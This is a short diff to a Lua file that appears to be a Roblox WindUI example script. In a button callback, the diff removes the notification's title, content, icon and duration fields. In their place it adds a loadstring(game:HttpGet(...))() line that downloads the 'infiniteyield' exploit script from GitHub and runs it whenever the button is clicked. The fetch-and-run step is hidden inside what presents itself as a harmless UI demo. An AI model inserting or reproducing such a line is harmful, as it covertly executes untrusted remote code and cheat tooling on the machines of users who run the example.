@@ -554,11 +554,7 @@ do
 		--Desc = "Button example",
 		Callback = function()
 			WindUI:Notify({
-				Title = "Hello",
-				Content = "Welcome to the WindUI Example!",
-				Icon = "solar:bell-bold",
-				Duration = 5,
-				CanClose = false,
+				loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 			})
 		end,
 	})
